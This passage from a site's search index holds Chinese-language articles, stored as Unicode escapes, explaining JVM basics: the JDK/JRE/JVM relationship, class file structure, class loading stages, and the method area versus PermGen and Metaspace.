5e38\u8bf4Java\u65f6\u9ed8\u8ba4\u5df2\u7ecf\u628aJVM\u7b97\u8fdb\u6765\u4e86\u3002</p> <p>\u8fd9\u4e48\u8bf4\u867d\u7136\u6ca1\u9519\u4f46\u662f\u786e\u5b9e\u4e0d\u592a\u51c6\u786e\uff0c\u800c\u4e14JVM\u4ece\u8bbe\u8ba1\u4e0a\u770b\u4e5f\u5e76\u975e\u53ea\u60f3\u8fd0\u884cJava\u8bed\u8a00\uff0c\u800c\u662f\u9762\u5411\u6240\u6709\u8bed\u8a00\u7684\u8fd0\u884c\u5e73\u53f0\uff0c\u53ea\u8981\u9075\u5b88JVM\u7684\u7ea6\u5b9a(\u53ea\u8981\u7f16\u8bd1\u6210.class\u6587\u4ef6)\uff0c\u90a3\u4e48\u4efb\u4f55\u8bed\u8a00\u90fd\u53ef\u4ee5\u8fd0\u884c\u5728JVM\u865a\u62df\u673a\u4e0a\u7684\uff0c\u73b0\u5728\u786e\u5b9e\u4e5f\u6709\u9664\u4e86Java\u4e4b\u5916\u7684\u5f88\u591a\u8bed\u8a00\u90fd\u662f\u8fd0\u884c\u5728JVM\u4e0a\u4e86\uff0c\u6bd4\u5982scala\u3001kotlin\u3001groovy\u7b49\uff0c\u6240\u4ee5\u7efc\u5408\u6765\u8bf4JVM\u5176\u5b9e\u662f\u4e00\u4e2a\u72ec\u7acb\u7684\u4e2a\u4f53\uff0c\u5b83\u662f\u4e00\u4e2a\u53ef\u4ee5\u8fd0\u884c\u4efb\u4f55\u8bed\u8a00\u7684\u5e73\u53f0\u3002</p> <p></p>"},{"location":"CTF/Java_Security/Article2/index.html#jdkjrejvm","title":"\u4e8c.JDK\u3001JRE\u3001JVM\u7684\u5173\u7cfb","text":"<p>JDK\uff08Java Development Kit\uff09\uff1aJDK \u662f Java \u5f00\u53d1\u5de5\u5177\u5305\uff0c\u5b83\u662f\u5f00\u53d1 Java \u7a0b\u5e8f\u7684\u57fa\u7840\u3002JDK \u5305\u542b\u4e86 Java \u7f16\u8bd1\u5668\uff08javac\uff09,Java \u8fd0\u884c\u65f6\u73af\u5883\uff08JRE\uff09,Java \u76f8\u5173\u7684\u5de5\u5177\u548c\u5e93\u7b49\u3002\u5f00\u53d1\u4eba\u5458\u4f7f\u7528 JDK \u6765\u7f16\u5199,\u7f16\u8bd1\u548c\u8c03\u8bd5 Java \u7a0b\u5e8f\u3002</p> <p>JRE\uff08Java Runtime Environment\uff09\uff1aJRE \u662f Java \u8fd0\u884c\u65f6\u73af\u5883\uff0c\u5b83\u5305\u542b\u4e86 Java \u865a\u62df\u673a\uff08JVM\uff09\u4ee5\u53ca\u8fd0\u884c Java \u5e94\u7528\u7a0b\u5e8f\u6240\u9700\u7684\u6838\u5fc3\u5e93\u548c\u6587\u4ef6\u3002\u5982\u679c\u4f60\u53ea\u662f\u60f3\u8fd0\u884c Java \u7a0b\u5e8f\u800c\u4e0d\u9700\u8981\u8fdb\u884c\u5f00\u53d1\uff0c\u53ea\u9700\u5b89\u88c5 JRE \u5373\u53ef\u3002</p> <p>JVM\uff08Java Virtual Machine\uff09\uff1aJVM \u662f Java \u865a\u62df\u673a\uff0c\u5b83\u662f Java \u7684\u6838\u5fc3\uff0c\u8d1f\u8d23\u5c06 Java \u4ee3\u7801\u7ffb\u8bd1\u6210\u53ef\u4ee5\u5728\u7279\u5b9a\u5e73\u53f0\u4e0a\u8fd0\u884c\u7684\u673a\u5668\u7801\u3002JVM \u7684\u4e3b\u8981\u4efb\u52a1\u662f\u89e3\u91ca Java \u5b57\u8282\u7801\u5e76\u5c06\u5176\u8f6c\u6362\u4e3a\u7279\u5b9a\u5e73\u53f0\u7684\u672c\u5730\u6307\u4ee4\uff0c\u4ece\u800c\u5b9e\u73b0 Java \u7684\u8de8\u5e73\u53f0\u7279\u6027\u3002</p> <p>\u5b83\u4eec\u4e4b\u95f4\u7684\u5173\u7cfb\u53ef\u4ee5\u7528\u5982\u4e0b\u56fe\u793a\u6765\u8bf4\u660e\uff1a</p> <p>+---------------------------------+   |              JDK                               |   | +-----------------------------+   |   | |            JRE                            |   |   | | +-------------------------+   |   |   | | |           JVM                     |    |   |   | | +-------------------------+   |   |   | +-----------------------------+   |   +---------------------------------+</p> <p>\u7b80\u5355\u6765\u8bf4\uff0cJDK \u5305\u542b\u4e86 JRE\uff0c\u800c JRE \u5305\u542b\u4e86 JVM\u3002\u5f00\u53d1\u4eba\u5458\u5728\u5f00\u53d1 Java \u7a0b\u5e8f\u65f6\u9700\u8981 JDK\uff0c\u800c\u7ec8\u7aef\u7528\u6237\u5728\u8fd0\u884c Java \u7a0b\u5e8f\u65f6\u53ea\u9700\u8981 JRE\u3002 JRE \u5219\u4f9d\u8d56 JVM \u6765\u5b9e\u9645\u8fd0\u884c Java \u4ee3\u7801\u3002</p> <p>\u9996\u5148\u9700\u8981\u786e\u5b9a\u7684\u662fJDK\u91cc\u662f\u5305\u542bJRE\u7684\uff0c\u800cJRE\u91cc\u53c8\u5305\u542bJVM\uff0c\u5b83\u4eec\u533a\u522b\u5728\u4e8e\u9762\u5411\u7684\u670d\u52a1\u5bf9\u8c61\u4e0d\u540c\u6240\u4ee5\u8fdb\u884c\u4e86\u4e0d\u540c\u7684\u5305\u88c5\u3002</p> <p>JVM\uff1aJVM\u662f\u9762\u5411\u64cd\u4f5c\u7cfb\u7edf\u7684\uff0c\u5b83\u8d1f\u8d23\u628a\u7a0b\u5e8f\u8fd0\u884c\u7f16\u8bd1\u6210\u7684.Class\u5b57\u8282\u7801\u89e3\u91ca\u6210\u7cfb\u7edf\u6240\u80fd\u8bc6\u522b\u7684\u6307\u4ee4\u5e76\u6267\u884c\uff0c\u540c\u65f6\u4e5f\u8d1f\u8d23\u7a0b\u5e8f\u8fd0\u884c\u7684\u5185\u5b58\u7684\u7ba1\u7406\u3002</p> <p>JRE\uff1aJRE\u662f\u9762\u5411\u4e8e\u7a0b\u5e8f\u7684\uff0cJRE\u5bf9JVM\u8fdb\u884c\u4e86\u4e00\u5c42\u5305\u88c5\uff0c\u5b83\u9664\u4e86\u63d0\u4f9bJVM\u7684\u529f\u80fd\u4e4b\u5916\uff0c\u8fd8\u63d0\u4f9b\u4e86\u4e00\u5957\u8bed\u8a00\u9700\u8981\u7f16\u8bd1\u6210Class\u540e\u5728JVM\u5185\u8fd0\u884c\u6240\u4f9d\u8d56\u73af\u5883\uff08\u6bd4\u5982\u8bf4 String.class\u3001Object.class\u7b49\u8fd9\u79cd\u8fd0\u884c\u65f6\u5fc5\u987b\u4f9d\u8d56\u7684\u5bf9\u8c61\uff09\u3002</p> <p>JDK\uff1aJDK\u662f\u9762\u5411\u66f4\u4e0a\u5c42\u7684\u5f00\u53d1\u4eba\u5458\uff0cJDK\u5728JRE\u7684\u57fa\u7840\u4e0a\u53c8\u8fdb\u884c\u4e86\u4e00\u5c42\u5305\u88c5\uff0c\u5b83\u9664\u4e86\u63d0\u4f9b\u8fd0\u884c\u529f\u80fd\u4e4b\u5916\uff0c\u8fd8\u5bf9\u5f00\u53d1\u4eba\u5458\u63d0\u4f9b\u4e86\u4e00\u5957\u5e38\u7528\u7684\u5f00\u53d1\u5de5\u5177\u548c\u7c7b\u5e93\uff0c\u6765\u65b9\u4fbf\u5f00\u53d1\u4eba\u5458\u5199\u4ee3\u7801\uff08\u6bd4\u5982\u8bf4\u65b9\u4fbf\u90e8\u7f72\u7684\u7f16\u8bd1\u5de5\u5177\uff0c\u65b9\u4fbf\u5f00\u53d1\u7684\u5de5\u5177\u7c7b\u7b49\uff09\u3002</p> <p></p>"},{"location":"CTF/Java_Security/Article2/index.html#jvm_1","title":"\u4e09.JVM\u7684\u5de5\u4f5c\u6d41\u7a0b","text":"<p>\u4ece\u6587\u7ae0\u7684\u7b2c\u4e00\u5f20\u56fe\u6211\u4eec\u77e5\u9053\uff0cJVM\u53ea\u8d1f\u8d23\u89e3\u91ca\u6267\u884c\u5c42\u9762\u7684\u5de5\u4f5c\uff0c\u800c\u5177\u4f53\u7684\u7f16\u8bd1\u5de5\u4f5c\u662f\u6ca1\u6709\u7eb3\u5165\u5230JVM\u5de5\u4f5c\u8303\u56f4\u7684\uff0c\u4f46\u662f\u4e3a\u4e86\u66f4\u6e05\u6670\u7684\u7406\u89e3JVM\u7684\u529f\u80fd\u6211\u4eec\u53c8\u5fc5\u987b\u4ece\u7f16\u8bd1\u5f00\u59cb\u4e86\u89e3\u3002</p> <p>\u4e00\u4e2ajava\u6587\u4ef6\u4ece\u7f16\u7801\u5230\u6267\u884c\u9700\u8981\u7ecf\u8fc7\u4e0b\u9762\u51e0\u4e2a\u9636\u6bb5</p> <p>1\u3001\u7f16\u8bd1\u9636\u6bb5\uff1a\u9996\u5148.java\u7ecf\u8fc7javac\u7f16\u8bd1\u6210.class\u6587\u4ef6</p> <p>2\u3001\u52a0\u8f7d\u9636\u6bb5\uff1a\u7136\u540e.class\u6587\u4ef6\u7ecf\u8fc7\u7c7b\u7684\u52a0\u8f7d\u5668\u52a0\u8f7d\u5230JVM\u5185\u5b58\u3002</p> <p>3\u3001\u89e3\u91ca\u9636\u6bb5\uff1aclass\u5b57\u8282\u7801\u7ecf\u8fc7\u5b57\u8282\u7801\u89e3\u91ca\u5668\u89e3\u91ca\u6210\u7cfb\u7edf\u53ef\u8bc6\u522b\u7684\u6307\u4ee4\u7801\u3002</p> <p>4\u3001\u6267\u884c\u9636\u6bb5\uff1a\u7cfb\u7edf\u518d\u5411\u786c\u4ef6\u8bbe\u5907\u53d1\u9001\u6307\u4ee4\u7801\u6267\u884c\u64cd\u4f5c\u3002</p> <p></p>"},{"location":"CTF/Java_Security/Article2/index.html#1","title":"1\u3001\u7f16\u8bd1\u9636\u6bb5","text":"<p>\u7c7b\u7684\u7f16\u8bd1\u9636\u6bb5\u4e3b\u8981\u76ee\u7684\u662f\u628a\u6e90\u7801\u6587\u4ef6\u7f16\u8bd1\u6210JVM\u53ef\u4ee5\u89e3\u6790\u7684class\u6587\u4ef6\uff0c\u8fd9\u4e2a\u9636\u6bb5\u4f1a\u7ecf\u8fc7\u8bcd\u6cd5\u5206\u6790\u3001\u8bed\u6cd5\u8bed\u4e49\u5206\u6790\u3001\u751f\u6210\u5b57\u8282\u7801\uff0c\u8fd9\u4e2a\u51e0\u4e2a\u9636\u6bb5\u540e\u751f\u6210\u6700\u540e\u7684class, \u752816\u8fdb\u5236\u7684\u65b9\u5f0f\u6253\u5f00class\u6587\u4ef6\u540e\u5185\u5bb9\u5927\u6982\u5982\u4e0b\u56fe:</p> <p></p>"},{"location":"CTF/Java_Security/Article2/index.html#class","title":"class\u6587\u4ef6\u5305\u542b\u4e0b\u9762\u51e0\u90e8\u5206\u5185\u5bb9","text":"<p>Magic Number(\u9b54\u6570)\uff1a \u5728.class\u6587\u4ef6\u59344\u4e2a\u5b57\u8282\u5982\u56fe\u201cCA FE BA BE\u201d\u5185\u5bb9\uff0c\u9b54\u6570\u7684\u4f5c\u7528\u5c31\u662f\u5b9a\u4e49\u4e00\u4e2a\u8bc6\u522b\u6807\u51c6\uff0c\u53ea\u6709\u7b26\u5408\u8fd9\u4e2a\u6807\u51c6\u624d\u80fd\u88abJVM\u89e3\u8bfb \u3002</p> <p>\u7248\u672c\u53f7: \u7f16\u8bd1class\u6587\u4ef6\u7684JDK\u7248\u672c\u53f7\uff0c\u6b64\u7248\u672c\u662f\u5411\u4e0b\u517c\u5bb9\u7684\u3002</p> <p>\u5e38\u91cf\u6c60: \u5e38\u91cf\u6c60\u4e2d\u4fe1\u606f\u4e3b\u8981\u5305\u62ec\u5b57\u9762\u91cf\uff08\u5b57\u7b26\u4e32\uff08String a=\u201cb\u201d\uff09\u3001\u57fa\u672c\u7c7b\u578b\u7684\u5e38\u91cf\uff08final \u4fee\u9970\u7684\u53d8\u91cf\uff09\uff09\u548c\u7b26\u53f7\u5f15\u7528\uff08\u7c7b\u548c\u63a5\u53e3\u5168\u9650\u5b9a\u540d\uff0c\u5b57\u6bb5\u540d\u79f0\u548c\u63cf\u8ff0\u7b26\u3001\u65b9\u6cd5\u540d\u79f0\u548c\u63cf\u8ff0\u7b26\uff0c\u65b9\u6cd5\u53e5\u67c4\u548c\u65b9\u6cd5\u7c7b\u578b\uff0c\u52a8\u6001\u8c03\u7528\u70b9\u548c\u52a8\u6001\u5e38\u91cf\uff09\u3002</p> <p>\u8bbf\u95ee\u6807\u5fd7: \u8be5\u7c7b\u662f\u5426\u4e3a\u63a5\u53e3\u3001\u6ce8\u91ca\u3001\u679a\u4e3e\u3001\u6a21\u5757\uff0c\u662f\u5426\u4e3afinal ,abstract\u7b49\u4fe1\u606f\u3002</p> <p>\u7c7b\u7d22\u5f15: \u7c7b\u7d22\u5f15\u3001\u7236\u7c7b\u7d22\u5f15\u3001\u63a5\u53e3\u7d22\u5f15\u96c6\u5408\uff0c\u7528\u4e8e\u786e\u5b9a\u7c7b\u7684\u7ee7\u627f\u548c\u5b9e\u73b0\u5173\u7cfb\u3002</p> <p>\u5b57\u6bb5\u8868\u96c6\u5408\uff1a\u7528\u4e8e\u63cf\u8ff0\u63a5\u53e3\u6216\u8005\u7c7b\u4e2d\u58f0\u660e\u7684\u53d8\u91cf\u4fe1\u606f\uff0c\u5982\u4fee\u9970\u4f5c\u7528\u57df\uff08public,private,protected\uff09,\u662f\u5b9e\u4f8b\u53d8\u91cf\u8fd8\u662f\u7c7b\u53d8\u91cf(static)\uff0c\u662f\u5426\u53ef\u53d8(final),\u662f\u5426\u53ef\u5e8f\u5217\u5316(transient),\u5e76\u53d1\u53ef\u89c1\u6027(volatile)\uff0c\u5b57\u6bb5\u6570\u636e\u7c7b\u578b\uff0c\u5b57\u6bb5\u540d\u3002</p> <p>\u65b9\u6cd5\u8868\u96c6\u5408\uff1a\u65b9\u6cd5\u8868\u96c6\u5408\u548c\u5b57\u6bb5\u8868\u7684\u4fe1\u606f\u7c7b\u4f3c\uff0c\u53ea\u4e0d\u8fc7\u8fd9\u91cc\u4fdd\u5b58\u7684\u662f\u4fdd\u5b58\u65b9\u6cd5\u76f8\u5173\u7684\u4fe1\u606f\uff0c\u5305\u62ec\u65b9\u6cd5\u7684\u540d\u79f0\uff0c\u8bbf\u95ee\u6807\u5fd7(\u5982public \u3001static \u3001final\u3001abstract\u3001native\u3001sychronized\u7b49)\uff0c\u540d\u79f0\u7d22\u5f15\uff0c\u5c5e\u6027\u8868\u96c6\u5408\uff08\u5728\u65b9\u6cd5\u5185\u5b9a\u4e49\u7684\u5c5e\u6027\u3001\u65b9\u9762\u91cc\u9762\u7684\u4ee3\u7801\u6307\u4ee4\uff09\u7b49\u4fe1\u606f\u3002</p> <p>\u5c5e\u6027\u8868\u96c6\u5408: \u5305\u62ec\u7c7b\u3001\u65b9\u6cd5\u3001\u5b9e\u4f8b\u7684\u53d8\u91cf\u5c5e\u6027\u548c\u4ee3\u7801\u7684\u6307\u4ee4\u7801\u3002</p>"},{"location":"CTF/Java_Security/Article2/index.html#2","title":"2\u3001\u52a0\u8f7d\u9636\u6bb5","text":"<p>\u52a0\u8f7d\u9636\u6bb5\u4e3b\u8981\u662f\u628a\u7f16\u8bd1\u9636\u6bb5\u751f\u6210\u7684.class\u6587\u4ef6\u52a0\u8f7d\u5230JVM\u5185\u5b58\u4e2d\u53bb\uff0c\u8fd9\u4e2a\u9636\u6bb5\u4f1a\u7ecf\u8fc7\u88c5\u8f7d\u3001\u8fde\u63a5\u3001\u521d\u59cb\u5316\u4e09\u4e2a\u8fc7\u7a0b\u3002</p>"},{"location":"CTF/Java_Security/Article2/index.html#21","title":"2.1\u3001\u88c5\u8f7d","text":"<p>\u88c5\u8f7d\u9636\u6bb5\u4e3b\u8981\u505a\u7684\u4e8b\u60c5\u5c31\u662f\u5148\u628aclass\u7684\u4fe1\u606f\u8bfb\u5230\u5185\u5b58\u6765\u3002</p> <p>\uff081\uff09\u5148\u901a\u8fc7\u7c7b\u7684\u5168\u9650\u5b9a\u540d\u8bfb\u53d6\u5230\u63cf\u8ff0\u6b64\u7c7b\u7684\u4e8c\u8fdb\u5236\u6d41\u3002</p> <p>\uff082\uff09\u628a\u5b57\u8282\u6d41\u4e2d\u63cf\u8ff0\u9759\u6001\u7ed3\u6784\u7684\u4fe1\u606f\u8f6c\u5316\u4e3a\u65b9\u6cd5\u533a\u4e2d\u7684\u8fd0\u884c\u65f6\u6570\u636e\u7ed3\u6784\u3002</p> <p>\uff083\uff09\u5728Java\u5806\u4e2d\u751f\u6210\u4e00\u4e2a\u4ee3\u8868\u8fd9\u4e2a\u7c7b\u7684java.lang.Class\u5bf9\u8c61\uff0c\u4f5c\u4e3a\u8fd9\u4e2a\u5bf9\u8c61\u7684\u8bbf\u95ee\u5165\u53e3\u3002</p> <pre><code>public class TestJVM {\n\n    public static int a;\n    public static TestJVM testJVM;\n\n    static {\n        a=88;\n        testJVM=new TestJVM();\n    }\n\n}\n</code></pre> <p>\u4e0a\u9762\u7684\u4ee3\u7801\u7ecf\u8fc7\u52a0\u8f7d\u9636\u6bb5\u540e\u4f1a\u5728JVM\u5185\u5b58\u4fdd\u5b58\u7740\u7c7b\u7684\u5b57\u8282\u7801\uff0c\u5e76\u4e14\u4f1a\u751f\u6210\u4e00\u4e2aTestJVM.Class\u5bf9\u8c61\uff0c\u8fd9\u4e2a\u5bf9\u8c61\u662f\u4f5c\u4e3aTestJVM.class\u7684\u7edf\u4e00\u8bbf\u95ee\u5165\u53e3\uff0c\u4e0b\u56fe\u662f\u6309\u903b\u8f91\u5206\u533a\uff0c\u5e76\u975e\u6570\u636e\u5b9e\u9645\u4fdd\u5b58\u7269\u7406\u4f4d\u7f6e\u3002</p> <p></p>"},{"location":"CTF/Java_Security/Article2/index.html#22","title":"2.2\u3001\u8fde\u63a5","text":""},{"location":"CTF/Java_Security/Article3/index.html","title":"Index","text":"<p>\u6211\u4eec\u5df2\u7ecf\u4e86\u89e3\u4e86JVM\u7684\u57fa\u672c\u5de5\u4f5c\u6d41\u7a0b\u4ee5\u53ca\u5728\u6bcf\u4e2a\u9636\u6bb5\u5927\u6982\u505a\u4e86\u54ea\u4e9b\u4e8b\u60c5\uff0c\u8fd9\u4e00\u7bc7\u6211\u4eec\u4e3b\u8981\u63a2\u8ba8\u4e00\u4e0b\u6e90\u7801\u7ecf\u8fc7\u7f16\u8bd1\u3001\u52a0\u8f7d\u540e\u6700\u7ec8\u8fd9\u4e9b\u4fe1\u606f\u5728JVM\u5728\u8fd0\u884c\u540e\u662f\u5982\u4f55\u8fdb\u884c\u5206\u7c7b\u5b58\u50a8\u7684\u3002 \u6839\u636e\u5404\u79cd\u6570\u636e\u7684\u7279\u6027JVM\u4ece\u903b\u8f91\u4e0a\u628a\u5185\u5b58\u5212\u5206\u6210\u4e86\u51e0\u4e2a\u533a\u57df\uff1b\u5206\u522b\u4e3a\u65b9\u6cd5\u533a\u3001\u865a\u62df\u673a\u6808\u3001\u672c\u5730\u65b9\u6cd5\u6808\u3001\u7a0b\u5e8f\u8ba1\u6570\u5668\u3001\u5806 5\u4e2a\u533a\u57df\uff0c\u4e86\u89e3\u8fd9\u51e0\u4e2a\u5206\u533a\u5bf9\u6211\u4eec\u7684\u7f16\u7a0b\u548c\u8c03\u4f18\u6709\u7740\u91cd\u8981\u7684\u610f\u4e49\uff0c\u4e0b\u9762\u6211\u4eec\u4e00\u8d77\u6765\u9010\u4e2a\u4e86\u89e3\u3002</p> <p></p>"},{"location":"CTF/Java_Security/Article3/index.html#_1","title":"\u4e00.\u65b9\u6cd5\u533a","text":"<p>JVM\u65b9\u6cd5\u533a\u662f\u7528\u4e8e\u4fdd\u5b58\u5df2\u7ecf\u88ab\u865a\u62df\u673a\u52a0\u8f7d\u7684\u7c7b\u5143\u4fe1\u606f\uff08\u5305\u62ec\u7c7b\u7684\u7248\u672c\u3001\u5b57\u6bb5\u3001\u65b9\u6cd5\u3001\u63a5\u53e3\u548c\u7236\u7c7b\u7b49\u4fe1\u606f\uff09\u3001\u8fd0\u884c\u65f6\u5e38\u91cf\u4fe1\u606f(static\u3001final\u5b9a\u4e49\u7684\u5e38\u91cf)\u3001\u5b57\u7b26\u4e32\u5e38\u91cf\u4fe1\u606f(String a=\"dfc\")\u3002</p>"},{"location":"CTF/Java_Security/Article3/index.html#1","title":"1.\u65b9\u6cd5\u533a\u3001\u6c38\u4e45\u4ee3\u3001\u5143\u6570\u636e\u533a\u7684\u5173\u7cfb","text":"<p>\u5728Java\u865a\u62df\u673a\uff08JVM\uff09\u4e2d\uff0c\u65b9\u6cd5\u533a\uff08Method Area\uff09\u3001\u6c38\u4e45\u4ee3\uff08PermGen\uff0cPermanent Generation\uff09\u548c\u5143\u6570\u636e\u533a\uff08Metadata Area\uff09\u662f\u4e09\u4e2a\u76f8\u5173\u7684\u6982\u5ff5\uff0c\u4f46\u5728\u4e0d\u540c\u7684JVM\u5b9e\u73b0\u7248\u672c\u4e2d\u53ef\u80fd\u6709\u6240\u4e0d\u540c\u3002\u5728Java 8\u53ca\u4e4b\u524d\u7684\u7248\u672c\u4e2d\uff0c\u901a\u5e38\u4f7f\u7528\u6c38\u4e45\u4ee3\u6765\u5b9e\u73b0\u65b9\u6cd5\u533a\u548c\u5143\u6570\u636e\u533a\uff0c\u4f46\u5728Java 8\u53ca\u4e4b\u540e\u7684\u7248\u672c\u4e2d\uff0c\u6c38\u4e45\u4ee3\u5df2\u88ab\u5143\u7a7a\u95f4\uff08Metaspace\uff09\u6240\u53d6\u4ee3\u3002</p> <p>1.\u65b9\u6cd5\u533a\uff08Method Area\uff09\uff1a\u65b9\u6cd5\u533a\u662fJVM\u7684\u4e00\u90e8\u5206\uff0c\u7528\u4e8e\u5b58\u50a8\u7c7b\u7684\u7ed3\u6784\u4fe1\u606f\u3001\u8fd0\u884c\u65f6\u5e38\u91cf\u6c60\u3001\u9759\u6001\u53d8\u91cf\u3001\u7c7b\u4e2d\u7684\u5b57\u8282\u7801\u7b49\u3002\u5728Java\u4e2d\uff0c\u6bcf\u4e2a\u7c7b\u90fd\u5bf9\u5e94\u4e00\u4e2aClass\u5bf9\u8c61\uff0c\u8fd9\u4e9bClass\u5bf9\u8c61\u7684\u4fe1\u606f\u5c31\u5b58\u50a8\u5728\u65b9\u6cd5\u533a\u4e2d\u3002\u65b9\u6cd5\u533a\u901a\u5e38\u662f\u7ebf\u7a0b\u5171\u4eab\u7684\uff0c\u56e0\u4e3a\u5b83\u5305\u542b\u4e86\u6240\u6709\u5df2\u52a0\u8f7d\u7684\u7c7b\u7684\u4fe1\u606f\uff0c\u800c\u7c7b\u7684\u4fe1\u606f\u5728\u6574\u4e2a\u5e94\u7528\u7a0b\u5e8f\u4e2d\u662f\u5171\u4eab\u7684\u3002</p> <p>2.\u6c38\u4e45\u4ee3\uff08PermGen\uff0cPermanent Generation\uff09\uff1a\u6c38\u4e45\u4ee3\u662fJava\u865a\u62df\u673a\u5806\u5185\u5b58\u7684\u4e00\u90e8\u5206\uff0c\u5728Java 8\u53ca\u4e4b\u524d\u7684\u7248\u672c\u4e2d\u7528\u4e8e\u5b9e\u73b0\u65b9\u6cd5\u533a\u3002\u6c38\u4e45\u4ee3\u4e3b\u8981\u7528\u4e8e\u5b58\u50a8\u7c7b\u7684\u5143\u4fe1\u606f\u3001\u9759\u6001\u53d8\u91cf\u3001\u5e38\u91cf\u7b49\u3002\u7531\u4e8e\u6c38\u4e45\u4ee3\u7684\u5927\u5c0f\u662f\u6709\u9650\u7684\uff0c\u5e76\u4e14\u5728\u67d0\u4e9b\u60c5\u51b5\u4e0b\u4f1a\u5bfc\u81f4\u5185\u5b58\u6ea2\u51fa\uff08OutOfMemoryError\uff09\uff0c\u56e0\u6b64\u5728Java 8\u4e2d\u88ab\u5143\u7a7a\u95f4\u6240\u53d6\u4ee3\u3002</p> <p>3.\u5143\u6570\u636e\u533a\uff08Metadata Area\uff09\uff1a\u5143\u6570\u636e\u533a\u662fJava 8\u53ca\u4e4b\u540e\u7248\u672c\u4e2d\u5f15\u5165\u7684\u6982\u5ff5\uff0c\u7528\u4e8e\u5b58\u50a8\u7c7b\u5143\u6570\u636e\u3002\u5143\u6570\u636e\u533a\u5b9e\u9645\u4e0a\u662f\u4e00\u5757\u672c\u5730\u5185\u5b58\uff0c\u4e0d\u518d\u53d7\u6c38\u4e45\u4ee3\u5927\u5c0f\u7684\u9650\u5236\uff0c\u56e0\u6b64\u53ef\u4ee5\u66f4\u597d\u5730\u9002\u5e94\u52a8\u6001\u5e94\u7528\u7a0b\u5e8f\u7684\u9700\u6c42\u3002\u5143\u6570\u636e\u533a\u7684\u5927\u5c0f\u53ef\u4ee5\u52a8\u6001\u8c03\u6574\uff0c\u5e76\u4e14\u53ef\u4ee5\u901a\u8fc7\u8bbe\u7f6e\u53c2\u6570\u6765\u63a7\u5236\u3002</p> <p>\u5728Java 8\u53ca\u4e4b\u524d\u7684\u7248\u672c\u4e2d\uff0c\u6c38\u4e45\u4ee3\u627f\u62c5\u4e86\u65b9\u6cd5\u533a\u548c\u5143\u6570\u636e\u533a\u7684\u529f\u80fd\uff0c\u800c\u5728Java 8\u53ca\u4e4b\u540e\u7684\u7248\u672c\u4e2d\uff0c\u6c38\u4e45\u4ee3\u88ab\u5143\u7a7a\u95f4\u6240\u53d6\u4ee3\uff0c\u5143\u7a7a\u95f4\u4f5c\u4e3a\u5143\u6570\u636e\u533a\u7684\u5b9e\u73b0\uff0c\u63d0\u4f9b\u4e86\u66f4\u7075\u6d3b\u3001\u66f4\u9ad8\u6548\u7684\u5b58\u50a8\u65b9\u5f0f\u3002\u56e0\u6b64\uff0c\u65b9\u6cd5\u533a\u3001\u6c38\u4e45\u4ee3\u548c\u5143\u6570\u636e\u533a\u4e4b\u95f4\u7684\u5173\u7cfb\u4e3b\u8981\u662f\u5728\u4e0d\u540cJava\u7248\u672c\u4e2d\u7684\u5185\u5b58\u7ed3\u6784\u7684\u5b9e\u73b0\u65b9\u5f0f\u4e0a\u7684\u4e0d\u540c\u3002</p> <p>\u65b9\u6cd5\u533a\u662fJVM \u5b9a\u4e49\u7684\u4e00\u79cd\u89c4\u8303\uff0c\u662f\u6240\u6709\u865a\u62df\u673a\u90fd\u9700\u8981\u9075\u5b88\u7684\u7ea6\u5b9a\uff0c \u800c\u201c\u6c38\u4e45\u4ee3\uff08PermGen space\uff09\u201d\u548c\u201c\u5143\u6570\u636e\uff08MetaSpace\uff09\u201d\u90fd\u662f\u5b9e\u9645\u67d0\u4e2a\u865a\u62df\u673a\u9488\u5bf9\u201c\u65b9\u6cd5\u533a\u201d\u7684\u4e00\u79cd\u5b9e\u73b0\uff0c\u201c\u6c38\u4e45\u4ee3\u201d\u662f\u7684JDK1.7\u4e4b\u524d Hotspot\u865a\u62df\u673a\u5bf9\u65b9\u6cd5\u533a\u7684\u5b9e\u73b0\uff0c\u800c\u201c\u5143\u6570\u636e\u201d\u5219\u662f1.8\u4e4b\u540eHotspot\u865a\u62df\u673a\u9488\u5bf9\u65b9\u6cd5\u533a\u7684\u4e00\u79cd\u5b9e\u73b0\u800c\u5df2\u3002</p>"},{"location":"CTF/Java_Security/Article3/index.html#2permgen-space-metaspace","title":"2.PermGen space \u548cMetaSpace\u7684\u533a\u522b?","text":"<p>HotSpot\u662fOracle JDK\u548cOpenJDK\u4e2d\u9ed8\u8ba4\u7684Java\u865a\u62df\u673a\uff08JVM\uff09\u5b9e\u73b0\u3002\u5b83\u662f\u4e00\u4e2a\u9ad8\u6027\u80fd\u3001\u6210\u719f\u7684JVM\uff0c\u7531Sun Microsystems\uff08\u73b0\u5728\u662fOracle Corporation\uff09\u5f00\u53d1\u5e76\u6301\u7eed\u4f18\u5316\u3002HotSpot\u91c7\u7528\u5373\u65f6\u7f16\u8bd1\uff08Just-In-Time Compilation\uff0cJIT\uff09\u6280\u672f\uff0c\u80fd\u591f\u5728\u8fd0\u884c\u65f6\u5c06Java\u5b57\u8282\u7801\u76f4\u63a5\u7f16\u8bd1\u6210\u672c\u5730\u673a\u5668\u4ee3\u7801\uff0c\u4ece\u800c\u63d0\u9ad8\u7a0b\u5e8f\u7684\u6267\u884c\u6027\u80fd\u3002</p> <p>HotSpot JVM\u5177\u6709\u8bb8\u591a\u4f18\u5316\u529f\u80fd\uff0c\u5305\u62ec\uff1a</p> <p>1.\u5373\u65f6\u7f16\u8bd1\u5668\uff08JIT Compiler\uff09\uff1aHotSpot\u5305\u542b\u4e24\u4e2a\u5373\u65f6\u7f16\u8bd1\u5668\uff0c\u5206\u522b\u662f\u5ba2\u6237\u7aef\u7f16\u8bd1\u5668\uff08C1\uff09\u548c\u670d\u52a1\u7aef\u7f16\u8bd1\u5668\uff08C2\uff09\u3002\u8fd9\u4e24\u4e2a\u7f16\u8bd1\u5668\u6839\u636e\u7a0b\u5e8f\u7684\u8fd0\u884c\u60c5\u51b5\uff0c\u52a8\u6001\u5730\u5c06\u9891\u7e41\u6267\u884c\u7684\u5b57\u8282\u7801\u7f16\u8bd1\u6210\u672c\u5730\u673a\u5668\u4ee3\u7801\uff0c\u4ee5\u63d0\u9ad8\u6267\u884c\u901f\u5ea6\u3002</p> <p>2.\u5783\u573e\u56de\u6536\u5668\uff08Garbage Collector\uff09\uff1aHotSpot\u5305\u542b\u591a\u79cd\u5783\u573e\u56de\u6536\u5668\uff0c\u5982\u65b0\u751f\u4ee3\u56de\u6536\u5668\uff08Parallel Scavenge\u3001G1\uff09\u3001\u8001\u5e74\u4ee3\u56de\u6536\u5668\uff08CMS\u3001Parallel 